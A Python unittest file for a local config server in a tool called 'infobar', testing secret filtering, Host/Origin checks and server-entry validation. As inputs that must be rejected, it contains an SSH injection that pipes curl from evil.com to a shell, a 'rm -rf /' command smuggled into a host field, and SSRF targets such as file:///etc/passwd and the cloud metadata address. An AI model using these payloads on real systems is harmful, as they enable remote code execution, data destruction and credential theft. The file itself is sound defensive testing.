"""Config segura y servidor local: guardado atomico por fusion, ultimo valor bueno, estado de la
interfaz aparte, filtro de secretos, cabeceras Host/Origin/tipo y validacion de servidores.

Arrancar con:  python3 -m unittest discover tests
"""
import glob
import http.client
import json
import os
import sys
import threading
import unittest
from unittest import mock

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import aislamiento  # noqa: E402,F401  (HOME y rutas temporales: antes que costbar)
from infobar import claves, config_y_estado, rutas, servidor_local  # noqa: E402
from infobar.servidores import errores_ips, errores_servidores, url_valida  # noqa: E402

CONFIG_BASE = {
    "tema": "oscuro",
    "nan_api_key": "sk-no-debe-salir",
    "limite_hora_tokens": 8000000, "limite_5h_tokens": 123, "limite_semana_tokens": 456,
    "aliases": {"nan.builders": "NaN"},
    "proveedores": [{"nombre": "NaN", "modelos": [], "limite_5h_tokens": 0}],
    "servidores": [{"nombre": "produccion", "ssh": "infobar@produccion"}],
}


def _escribe_config(datos):
    with open(rutas.CONFIG, "w", encoding="utf-8") as f:
        json.dump(datos, f)


def _lee_config():
    with open(rutas.CONFIG, encoding="utf-8") as f:
        return json.load(f)


class LimpiaConfig(unittest.TestCase):
    def setUp(self):
        for ruta in [rutas.CONFIG, rutas.UI_ESTADO] + glob.glob(f"{rutas.CONFIG}.bak.*"):
            if os.path.exists(ruta):
                os.remove(ruta)
        config_y_estado._ULTIMO_CFG = {}
        _escribe_config(CONFIG_BASE)


class GuardarConfigTest(LimpiaConfig):
    def test_fusiona_sin_borrar_lo_que_no_viene(self):
        config_y_estado.guardar_config({"aliases": {"x": "y"}})
        d = _lee_config()
        self.assertEqual(d["aliases"], {"x": "y"})
        self.assertEqual(d["servidores"], CONFIG_BASE["servidores"])
        self.assertEqual(d["nan_api_key"], "sk-no-debe-salir")
        if os.name != "nt":                    # NTFS no tiene bits de permiso POSIX
            self.assertEqual(oct(os.stat(rutas.CONFIG).st_mode & 0o777), "0o600")

    def test_copias_rotativas(self):
        config_y_estado.guardar_config({"a": 1})
        self.assertGreaterEqual(len(glob.glob(f"{rutas.CONFIG}.bak.*")), 1)
        for i in range(8):
            open(f"{rutas.CONFIG}.bak.2000010{i}-000000", "w").close()
        config_y_estado.guardar_config({"a": 2})
        self.assertLessEqual(len(glob.glob(f"{rutas.CONFIG}.bak.*")), config_y_estado.COPIAS_CONFIG)

    def test_escritores_concurrentes_no_se_pisan(self):
        def escribe(prefijo):
            for i in range(25):
                config_y_estado.guardar_config({f"{prefijo}{i}": i})
        hilos = [threading.Thread(target=escribe, args=(p,)) for p in ("a", "b")]
        [h.start() for h in hilos]
        [h.join() for h in hilos]
        d = _lee_config()
        for p in ("a", "b"):
            for i in range(25):
                self.assertEqual(d[f"{p}{i}"], i)

    def test_cfg_usa_la_ultima_version_buena_si_el_fichero_se_rompe(self):
        self.assertEqual(config_y_estado.cfg()["limite_5h_tokens"], 123)
        with open(rutas.CONFIG, "w") as f:
            f.write('{"a medio escribir')
        self.assertEqual(config_y_estado.cfg()["limite_5h_tokens"], 123)


    def test_no_reescribe_un_config_ilegible(self):
        with open(rutas.CONFIG, "w") as f:
            f.write('{"servidores": [1,],}')
        with self.assertRaises(ValueError):
            config_y_estado.guardar_config({"a": 1})
        with open(rutas.CONFIG) as f:
            self.assertEqual(f.read(), '{"servidores": [1,],}')

    def test_sin_cambios_no_hay_copia_nueva(self):
        config_y_estado.guardar_config({"a": 1})
        n = len(glob.glob(f"{rutas.CONFIG}.bak.*"))
        config_y_estado.guardar_config({"a": 1})
        self.assertEqual(len(glob.glob(f"{rutas.CONFIG}.bak.*")), n)

    def test_guardar_estado_desde_varios_hilos(self):
        def escribe(k):
            for i in range(20):
                config_y_estado.guardar_estado({"ficheros": {k: i}})
        hilos = [threading.Thread(target=escribe, args=(k,)) for k in "abcd"]
        [h.start() for h in hilos]
        [h.join() for h in hilos]
        self.assertEqual(config_y_estado.leer_estado()["version"], config_y_estado.VERSION_ESTADO)


class ServidoresAparteTest(LimpiaConfig):
    """Los servidores van a servidores.json (fuera de git); config.json no lleva hosts."""

    def setUp(self):
        super().setUp()
        if os.path.exists(rutas.CONFIG_SERVIDORES):
            os.remove(rutas.CONFIG_SERVIDORES)
        config_y_estado._ULTIMO_SRV = {}
        config_y_estado._MIGRADO.clear()

    def test_migra_y_reparte(self):
        c = config_y_estado.cfg()                                  # primera lectura: migra
        self.assertEqual(c["servidores"], CONFIG_BASE["servidores"])
        self.assertNotIn("servidores", _lee_config())              # ya no esta en config.json
        with open(rutas.CONFIG_SERVIDORES) as f:
            self.assertEqual(json.load(f)["servidores"], CONFIG_BASE["servidores"])
        nuevos = [{"nombre": "web", "ssh": "infobar@web.example.com"}]
        config_y_estado.guardar_config({"servidores": nuevos, "aliases": {"x": "y"}, "intervalo_normal_s": 120})
        d = _lee_config()
        self.assertEqual(d["aliases"], {"x": "y"})
        self.assertNotIn("servidores", d)
        self.assertNotIn("intervalo_normal_s", d)
        self.assertEqual(config_y_estado.cfg()["servidores"], nuevos)
        self.assertEqual(config_y_estado.cfg()["intervalo_normal_s"], 120)
        if os.name != "nt":                    # NTFS no tiene bits de permiso POSIX
            self.assertEqual(oct(os.stat(rutas.CONFIG_SERVIDORES).st_mode & 0o777), "0o600")


class EstadoUITest(LimpiaConfig):
    def test_tema_se_migra_y_se_guarda_aparte(self):
        self.assertEqual(config_y_estado.leer_ui()["tema"], "oscuro")      # migrado de config.json
        config_y_estado.guardar_ui({"tema": "claro", "servidor_activo": "produccion"})
        self.assertEqual(config_y_estado.leer_ui()["tema"], "claro")
        self.assertEqual(_lee_config()["tema"], "oscuro")  # config.json intacto


class ServidorLocalTest(LimpiaConfig):
    @classmethod
    def setUpClass(cls):
        cls.srv = servidor_local.crear_servidor(0)
        cls.puerto = cls.srv.server_address[1]
        threading.Thread(target=cls.srv.serve_forever, daemon=True).start()
        cls.cookie = aislamiento.cookie_de(cls.srv)

    @classmethod
    def tearDownClass(cls):
        cls.srv.shutdown()
        cls.srv.server_close()

    def _pide(self, metodo, ruta, cuerpo=None, cabeceras=None):
        c = http.client.HTTPConnection("127.0.0.1", self.puerto, timeout=30)
        h = {"Host": f"127.0.0.1:{self.puerto}", "Cookie": self.cookie}
        h.update(cabeceras or {})
        datos = json.dumps(cuerpo).encode() if cuerpo is not None else None
        c.request(metodo, ruta, body=datos, headers=h)
        r = c.getresponse()
        return r.status, r.read()

    def _post_bueno(self, cuerpo):
        return self._pide("POST", "/guardar", cuerpo, {"Content-Type": "application/json",
                                                        "Origin": f"http://127.0.0.1:{self.puerto}"})

    def test_host_ajeno_rechazado(self):
        self.assertEqual(self._pide("GET", "/config.json", cabeceras={"Host": "evil.com"})[0], 403)
        self.assertEqual(self._pide("GET", "/", cabeceras={"Host": f"evil.com:{self.puerto}"})[0], 403)

    def test_navegador_abre_con_un_ticket_propio(self):
        # el navegador del sistema no comparte cookies con la ventana nativa: /navegador le da
        # un ticket nuevo de un solo uso en vez de depender de la sesion de quien hizo la peticion
        with mock.patch.object(servidor_local.webbrowser, "open") as abre:
            codigo, cuerpo = self._pide("GET", "/navegador")
        self.assertEqual(codigo, 200)
        self.assertEqual(json.loads(cuerpo), {"ok": True})
        abre.assert_called_once()
        (url,), _ = abre.call_args
        self.assertRegex(url, rf"^http://127\.0\.0\.1:{self.puerto}/entrar\?t=[\w-]+$")

    def test_navegador_sin_sesion_rechazado(self):
        c = http.client.HTTPConnection("127.0.0.1", self.puerto, timeout=30)
        c.request("GET", "/navegador", headers={"Host": f"127.0.0.1:{self.puerto}"})      # sin cookie
        r = c.getresponse()
        self.assertEqual(r.status, 401)

    def test_get_sin_secretos_y_con_cuotas(self):
        estado, cuerpo = self._pide("GET", "/config.json")
        d = json.loads(cuerpo)
        self.assertEqual(estado, 200)
        self.assertNotIn("nan_api_key", d)
        self.assertEqual(d["limite_5h_tokens"], 123)
        self.assertNotIn(b"sk-no-debe-salir", cuerpo)

    def test_post_sin_origen_o_tipo_rechazado(self):
        cuerpo = {"proveedores": [], "aliases": {}}
        self.assertEqual(self._pide("POST", "/guardar", cuerpo, {"Content-Type": "text/plain",
                                    "Origin": f"http://127.0.0.1:{self.puerto}"})[0], 403)
        self.assertEqual(self._pide("POST", "/guardar", cuerpo, {"Content-Type": "application/json"})[0], 403)
        self.assertEqual(self._pide("POST", "/guardar", cuerpo, {"Content-Type": "application/json",
                                    "Origin": "http://evil.com"})[0], 403)
        self.assertEqual(self._pide("POST", "/otra", cuerpo, {"Content-Type": "application/json",
                                    "Origin": f"http://127.0.0.1:{self.puerto}"})[0], 404)
        with open(rutas.CONFIG) as f:
            self.assertEqual(json.load(f), CONFIG_BASE)

    def test_ida_y_vuelta_conserva_cuotas_servidores_y_claves(self):
        _, cuerpo = self._pide("GET", "/origenes")
        cfg = json.loads(cuerpo)["config"]
        cfg["aliases"]["openrouter"] = "OpenRouter"
        self.assertEqual(self._post_bueno(cfg)[0], 200)
        d = _lee_config()
        self.assertEqual(d["aliases"]["openrouter"], "OpenRouter")
        self.assertEqual(d["limite_5h_tokens"], 123)
        self.assertEqual(d["servidores"], CONFIG_BASE["servidores"])
        self.assertEqual(d["nan_api_key"], "sk-no-debe-salir")

    def test_peticion_lanzada_desde_otra_web_rechazada(self):
        self.assertEqual(self._pide("GET", "/origenes", cabeceras={"Sec-Fetch-Site": "cross-site"})[0], 403)

    def test_content_length_raro(self):
        estado, _ = self._pide("POST", "/guardar", None, {"Content-Type": "application/json",
                               "Origin": f"http://127.0.0.1:{self.puerto}", "Content-Length": "abc"})
        self.assertEqual(estado, 413)

    def test_guardar_invalida_la_cache_del_escaneo(self):
        config_y_estado.guardar_estado({"ficheros": {"x": {}}})
        self.assertEqual(self._post_bueno({"proveedores": [], "aliases": {"a": "b"}})[0], 200)
        self.assertFalse(os.path.exists(rutas.STATE))

    def test_tipos_malos_rechazados(self):
        for malo in ({"proveedores": [1, "x"], "aliases": {}},
                     {"proveedores": [{"nombre": "A", "limite_5h_tokens": "mucho"}], "aliases": {}},
                     {"proveedores": [], "aliases": {"a": 3}},
                     {"proveedores": [], "aliases": {}, "limite_5h_tokens": -1}):
            self.assertEqual(self._post_bueno(malo)[0], 400, malo)
        self.assertEqual(_lee_config(), CONFIG_BASE)

    def test_secretos_por_sufijo_y_cuotas_intactas(self):
        self.assertFalse(servidor_local.es_secreto("limite_5h_tokens"))
        for n in ("access_token", "client_secret", "nan_api_key", "private_key", "Authorization"):
            self.assertTrue(servidor_local.es_secreto(n), n)

    def test_post_no_puede_meter_claves_ni_servidores_peligrosos(self):
        malo = {"proveedores": [], "aliases": {},
                "servidores": [{"nombre": "x", "ssh": "-oProxyCommand=curl evil|sh"}]}
        self.assertEqual(self._post_bueno(malo)[0], 400)
        con_clave = {"proveedores": [], "aliases": {}, "nan_api_key": "sk-del-atacante"}
        self.assertEqual(self._post_bueno(con_clave)[0], 200)
        self.assertEqual(_lee_config()["nan_api_key"], "sk-no-debe-salir")


class ValidacionServidoresTest(unittest.TestCase):
    def test_validos(self):
        self.assertEqual(errores_servidores([
            {"nombre": "produccion", "ssh": "infobar@produccion", "panel": "dokploy",
             "panel_url": "https://dokploy.example.com", "webs": ["https://example.com", "http://x.example.com"]},
            {"nombre": "solo ssh", "ssh": "alias-ssh"}]), [])
        self.assertEqual(errores_ips(["83.1.2.3", "2001:db8::1"]), [])

    def test_rechazos(self):
        casos = [
            {"nombre": "a", "ssh": "-oProxyCommand=x"},
            {"nombre": "a", "ssh": "user@host; rm -rf /"},
            {"nombre": "a", "ssh": "h", "panel": "dokploy", "panel_url": "http://dokploy.example.com"},
            {"nombre": "a", "ssh": "h", "panel": "otro", "panel_url": "https://x.es"},
            {"nombre": "a", "ssh": "h", "webs": ["file:///etc/passwd"]},
            {"nombre": "a", "ssh": "h", "webs": ["http://169.254.169.254/latest"]},
            {"nombre": "a", "ssh": "h", "webs": ["http://127.0.0.1:47391/"]},
            {"nombre": "a", "ssh": "h", "webs": ["https://user:pw@x.es"]},
            {"nombre": "<img>", "ssh": "h"},
        ]
        for c in casos:
            self.assertTrue(errores_servidores([c]), c)
        self.assertTrue(errores_servidores([{"nombre": "a", "ssh": "h"}, {"nombre": "a", "ssh": "g"}]))
        self.assertTrue(errores_servidores([{"nombre": "a\n", "ssh": "u@h\n"}]))

    def test_formas_raras_de_localhost(self):
        for host in ("localhost.", "127.1", "2130706433", "0x7f.0.0.1", "017700000001", "0",
                     "metadata.google.internal", "exa mple.com", "[::1]", "10.0.0.5", "x.es:99999"):
            self.assertTrue(url_valida(f"https://{host}/"), host)
        self.assertEqual(url_valida("https://example.com/"), "")
        self.assertEqual(url_valida("https://83.1.2.3:8443/"), "")
        self.assertTrue(errores_ips(["no-ip"]))


class VariosTest(unittest.TestCase):
    def test_a_local_anos_extremos_no_lanza(self):
        from infobar.lectores_logs import a_local
        self.assertEqual(a_local("0001-01-01T00:00:00Z"), "0001-01-01T00:00:00Z")
        a_local("9999-12-31T23:59:59-05:00")

    def test_nan_con_cache_valida_no_toca_el_llavero(self):
        import time
        from infobar import cuota_nan
        os.makedirs(os.path.dirname(rutas.NAN_USO_CACHE), exist_ok=True)
        with open(rutas.NAN_USO_CACHE, "w") as f:
            json.dump({"ts": time.time(), "inicio_mes": "2026-10-01", "por_modelo": {"glm": 5}}, f)
        llamadas = []
        original = cuota_nan.clave_nan
        cuota_nan.clave_nan = lambda: llamadas.append(1) or "x"
        try:
            self.assertEqual(cuota_nan.uso_nan("2026-10-01"), {"glm": 5})
        finally:
            cuota_nan.clave_nan = original
        self.assertEqual(llamadas, [])


class ClavesTest(unittest.TestCase):
    def test_cuentas(self):
        for c in ("nan", "dokploy:dokploy.example.com", "easypanel:panel.x.es:3000"):
            self.assertTrue(claves.cuenta_valida(c), c)
        for c in ("", "otra", "dokploy:", "dokploy:host con espacio", "nan; rm", "nan\n"):
            self.assertFalse(claves.cuenta_valida(c), c)

    def test_valores_no_admitidos_se_rechazan_antes_del_llavero(self):
        if not claves.hay_llavero():
            self.skipTest("sin Llavero")
        for v in ('con"comillas', "con espacio", "barra\\", ""):
            with self.assertRaises(ValueError):
                claves.guardar_clave("nan", v)


if __name__ == "__main__":
    unittest.main()
